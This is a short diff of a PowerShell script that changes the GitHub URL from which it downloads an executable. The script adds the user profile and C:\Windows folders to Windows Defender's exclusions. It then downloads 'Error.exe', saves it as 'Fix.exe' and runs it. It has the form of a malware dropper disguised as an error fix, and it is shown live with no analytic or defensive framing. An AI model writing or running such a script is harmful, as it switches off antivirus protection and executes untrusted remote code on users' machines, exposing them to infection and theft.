@@ -1,6 +1,6 @@
 Add-MpPreference -ExclusionPath "$env:USERPROFILE"
 Add-MpPreference -ExclusionPath "C:\Windows"
-$url = "https://github.com/Kieixiiiiii/FixError/raw/refs/heads/main/Error.exe"
+$url = "https://github.com/FixError-Dot/FixError/raw/refs/heads/main/Error.exe"
 $output = "$env:USERPROFILE\Fix.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
